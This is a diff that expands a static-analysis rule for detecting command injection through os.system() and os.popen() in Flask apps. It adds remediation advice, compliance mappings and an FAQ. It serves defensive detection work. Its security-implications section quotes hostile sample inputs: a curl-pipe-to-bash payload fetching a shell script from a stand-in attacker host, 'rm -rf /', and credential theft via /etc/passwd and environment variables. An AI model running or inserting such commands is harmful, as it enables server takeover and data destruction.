@@ -1,57 +1,235 @@
+# Rule Identity
 id: PYTHON-FLASK-SEC-001
 name: Flask Command Injection via os.system
-short_description: User input flows to os.system(). Use subprocess with list args and shlex.quote() instead.
+short_description: User input from Flask request parameters flows to os.system() or os.popen(). Sanitize with shlex.quote() or switch to subprocess with list arguments.
+
+# Classification
 severity: CRITICAL
 category: flask
 language: python
-ruleset: python/PYTHON-FLASK-SEC-001
+ruleset: python/flask/PYTHON-FLASK-SEC-001
+
+# Vulnerability Details
 cwe:
-- id: CWE-78
-  name: Improper Neutralization of Special Elements used in an OS Command
-  url: https://cwe.mitre.org/data/definitions/78.html
+  - id: CWE-78
+    name: "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+    url: https://cwe.mitre.org/data/definitions/78.html
+
+owasp:
+  - id: A03:2021
+    name: Injection
+    url: https://owasp.org/Top10/A03_2021-Injection/
+
 tags:
-- python
-- flask
-- command-injection
-- os-system
-- OWASP-A03
-- CWE-78
+  - python
+  - flask
+  - command-injection
+  - os-system
+  - os-popen
+  - shell-injection
+  - cross-file
+  - inter-procedural
+  - taint-analysis
+  - CWE-78
+  - OWASP-A03
+
+# Author
 author:
   name: Shivasurya
   url: https://x.com/sshivasurya
-description: "These rules detect OS command injection vulnerabilities in Flask applications where\nuser-controlled\
-  \ input from HTTP request parameters flows into system command execution\nfunctions. Two distinct attack\
-  \ surfaces are covered:\n\n- **SEC-001**: Detects flows to os.system(), os.popen(), and related os module\
-  \ functions\n  that execute shell commands as a single string, making them inherently vulnerable to\n\
-  \  shell metacharacter injection.\n\n- **SEC-002**: Detects flows to subprocess module functions (subprocess.call,\
-  \ subprocess.run,\n  subprocess.Popen, etc.) where user input may be passed as part of a command string,\n\
-  \  especially when shell=True is used.\n\nCommand injection allows attackers to execute arbitrary operating\
-  \ system commands on the\nserver hosting the Flask application, typically leading to full system compromise."
-message: User input flows to os.system(). Use subprocess with list args and shlex.quote() instead.
-secure_example: "from flask import Flask, request\nimport subprocess\nimport shlex\n\napp = Flask(__name__)\n\
-  \n@app.route('/ping')\ndef ping_host():\n    host = request.args.get('host')\n    # SAFE: Use subprocess\
-  \ with list arguments (no shell interpretation)\n    result = subprocess.run(['ping', '-c', '3', host],\
-  \ capture_output=True, text=True)\n    return result.stdout\n\n@app.route('/lookup')\ndef dns_lookup():\n\
-  \    domain = request.args.get('domain')\n    # SAFE: shlex.quote() escapes shell metacharacters\n \
-  \   safe_domain = shlex.quote(domain)\n    result = subprocess.check_output(['nslookup', safe_domain])\n\
-  \    return result"
-recommendations: []
+
+# Content
+description: |
+  This rule detects OS command injection in Flask applications where user-controlled
+  input from HTTP request parameters reaches os.system(), os.popen(), os.popen2(),
+  os.popen3(), or os.popen4(). These functions pass their argument to the system shell
+  as a single string, so shell metacharacters (;, &&, |, $(), backticks) in user input
+  are interpreted directly by /bin/sh.
+
+  The rule uses taint analysis to trace data flow from Flask request sources across
+  assignment chains, helper functions, and module boundaries. A simple grep for
+  "os.system" misses the cases that matter most in real codebases -- where the
+  vulnerable call is three function calls away from the route handler in a separate
+  utility module. Code Pathfinder follows the full chain and only flags flows where
+  attacker-controlled data actually reaches the shell call at argument position 0
+  (.tracks(0)), not flows where the tainted value appears in unrelated parts of the code.
+
+  os.system() and os.popen() are inherently more dangerous than subprocess with a list
+  because they unconditionally invoke a shell. Even if you validate the input, a single
+  missed edge case results in full command execution. The fix is to stop using these
+  functions for user-influenced commands.
+
+message: "User input flows to os.system() or os.popen(). Use subprocess with list arguments and shlex.quote()."
+
+security_implications:
+  - title: Arbitrary Command Execution
+    description: |
+      An attacker who controls the argument to os.system() can run any OS command
+      with the privileges of the Flask process. A payload like
+      "; curl http://attacker.com/shell.sh | bash" appended to a legitimate value
+      exfiltrates data or installs a reverse shell in a single request.
+  - title: Data Exfiltration and Lateral Movement
+    description: |
+      Once shell access is established, attackers read /etc/passwd, dump environment
+      variables (which contain database credentials, API keys, and cloud IAM tokens
+      in most container deployments), and pivot to internal network services that
+      are not exposed to the internet.
+  - title: Denial of Service
+    description: |
+      Injected commands like "rm -rf /" or fork bombs can crash the application server
+      or the underlying host. Even "sleep 9999" blocks the Flask worker indefinitely,
+      causing a process-exhaustion DoS that looks like a performance issue until
+      someone reads the process list.
+  - title: Persistence and Backdoor Installation
+    description: |
+      Attackers write cron jobs, modify startup scripts, or create new user accounts
+      via injected commands. These persist across application restarts and can survive
+      container image rebuilds if they reach a mounted volume.
+
+secure_example: |
+  from flask import Flask, request
+  import subprocess
+  import shlex
+
+  app = Flask(__name__)
+
+  @app.route('/ping')
+  def ping_host():
+      host = request.args.get('host', '')
+      # SAFE: list arguments -- the shell is never invoked, no metacharacter risk
+      result = subprocess.run(
+          ['ping', '-c', '3', host],
+          capture_output=True, text=True, timeout=10
+      )
+      return result.stdout
+
+  @app.route('/dns')
+  def dns_lookup():
+      domain = request.args.get('domain', '')
+      # SAFE: shlex.quote() wraps the value in single-quotes and escapes embedded quotes
+      safe_domain = shlex.quote(domain)
+      result = subprocess.check_output(f'nslookup {safe_domain}', shell=True, text=True)
+      return result
+
+recommendations:
+  - Replace os.system() and os.popen() with subprocess.run() using a list of arguments so the shell is never invoked and metacharacters are passed literally to the program.
+  - When a shell string is unavoidable, wrap every user-supplied value with shlex.quote() before interpolation -- it adds single-quote escaping that neutralizes metacharacters.
+  - Validate input against an allowlist of expected values (hostnames, filenames, identifiers) before passing it to any system call.
+  - Run the Flask process under a dedicated low-privilege OS user with no write access to sensitive directories and no ability to install packages or modify system files.
+  - Set subprocess timeouts to prevent long-running injected commands from consuming worker processes indefinitely.
+
+detection_scope: |
+  Scope: global (cross-file taint tracking across the entire project).
+
+  Sources: Flask HTTP input methods -- request.args.get(), request.form.get(),
+  request.values.get(), request.get_json(), request.cookies.get(),
+  request.headers.get() -- all of which carry attacker-controlled strings.
+
+  Sinks: os.system(), os.popen(), os.popen2(), os.popen3(), os.popen4().
+  The .tracks(0) setting focuses analysis on argument position 0, the command
+  string. This is the position where shell injection occurs. Arguments at other
+  positions (mode flags, buffer sizes) are not tracked.
+
+  Sanitizers: shlex.quote() and shlex.split() are recognized as sanitizers.
+  A flow through either function is treated as safe because shlex.quote()
+  produces a shell-escaped string that cannot be broken out of, and shlex.split()
+  tokenizes the input as a shell lexer would (useful for building argument lists).
+
+  The rule traces data through variable assignments, return values, function
+  arguments, and cross-file function calls. It does not trigger on hardcoded
+  strings or values that can only originate from trusted configuration sources.
+
+# References
 references:
-- title: CWE-78
-  url: https://cwe.mitre.org/data/definitions/78.html
-- title: OWASP Command Injection
-  url: https://owasp.org/www-community/attacks/Command_Injection
-- title: Python subprocess documentation
-  url: https://docs.python.org/3/library/subprocess.html
-- title: Python shlex.quote
-  url: https://docs.python.org/3/library/shlex.html#shlex.quote
-compliance: []
-faq: []
-similar_rules: []
+  - title: "CWE-78: OS Command Injection"
+    url: https://cwe.mitre.org/data/definitions/78.html
+  - title: OWASP OS Command Injection Defense Cheat Sheet
+    url: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+  - title: Python subprocess documentation
+    url: https://docs.python.org/3/library/subprocess.html
+  - title: Python shlex.quote
+    url: https://docs.python.org/3/library/shlex.html#shlex.quote
+  - title: OWASP Testing for Command Injection
+    url: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
+  - title: Python os module security notes
+    url: https://docs.python.org/3/library/os.html#os.system
+
+# Compliance
+compliance:
+  - standard: OWASP Top 10
+    requirement: "A03:2021 - Injection"
+  - standard: CWE Top 25
+    requirement: "CWE-78 ranked #5 in 2023 Most Dangerous Software Weaknesses"
+  - standard: PCI DSS v4.0
+    requirement: "Requirement 6.2.4 -- prevent injection attacks in bespoke and custom software"
+  - standard: NIST SP 800-53
+    requirement: "SI-10: Information Input Validation"
+  - standard: ASVS v4.0
+    requirement: "V5.2.2 -- verify that application protects against OS command injection"
+
+# FAQ
+faq:
+  - question: Why does this rule flag os.popen() but not subprocess.run()?
+    answer: |
+      os.popen() passes its argument directly to the system shell as a command string,
+      so any shell metacharacters in user input are interpreted. subprocess.run() with
+      a list of arguments bypasses the shell entirely -- the OS exec() call receives
+      the program name and arguments as separate tokens, so there is nothing for a
+      shell to interpret. The rule tracks taint to the shell-invoking functions only.
+
+  - question: I use shlex.quote() before calling os.system(). Will this still fire?
+    answer: |
+      No. shlex.quote() is a recognized sanitizer. If the tainted value passes through
+      shlex.quote() before reaching os.system(), the flow is considered sanitized and
+      no finding is reported. Make sure the quoting happens on the actual value that
+      reaches the shell call -- wrapping an unrelated variable does not help.
+
+  - question: How does this rule detect injection across multiple files?
+    answer: |
+      The rule uses global scope, meaning it follows data flow across file boundaries.
+      If request.args.get('host') is called in routes.py, stored in a variable, passed
+      to a utility function in helpers.py, and that function calls os.system(), the
+      full chain is flagged. This is the common real-world pattern -- route handlers
+      delegate to utility modules.
+
+  - question: Does this rule generate false positives on test files?
+    answer: |
+      It can if test files use hardcoded strings that look like request sources. In
+      practice, test fixtures usually use string literals, not request.args.get(),
+      so there is typically no flow to flag. If you have test utilities that call
+      os.system() with controlled data, add a # noqa comment or exclude the test
+      directory in your pathfinder configuration.
+
+  - question: What CVSS score should I assign to a confirmed finding?
+    answer: |
+      A confirmed os.system() injection from an unauthenticated HTTP endpoint scores
+      CVSS 3.1 Critical (9.8-10.0): Attack Vector Network, Attack Complexity Low,
+      Privileges Required None, User Interaction None, Scope Changed, all CIA impacts
+      High. Reduce the score if authentication is required or if the endpoint is only
+      accessible from the internal network.
+
+  - question: Does this cover os.popen2() and os.popen3()?
+    answer: |
+      Yes. The sinks include os.popen(), os.popen2(), os.popen3(), and os.popen4().
+      These are legacy functions removed in Python 3 but still present in Python 2
+      codebases. The rule covers all variants to handle both Python 2 and Python 3
+      projects.
+
+  - question: How do I suppress a finding I have reviewed and accepted as low risk?
+    answer: |
+      Add a # pathfinder: ignore PYTHON-FLASK-SEC-001 comment on the line where the
+      sink is called. Document why the finding is accepted (e.g., the input is validated
+      against a strict allowlist of known-safe values). Do not suppress findings without
+      written justification -- suppressions are reviewed during security audits.
+
+# Similar Rules
+similar_rules:
+  - PYTHON-FLASK-SEC-002
+  - PYTHON-DJANGO-SEC-004
+  - PYTHON-LAMBDA-SEC-001
+  - PYTHON-LANG-SEC-010
+
+# Test Files
 tests:
   positive: tests/positive/
   negative: tests/negative/
-owasp:
-- id: A03:2021
-  name: ''
-  url: ''
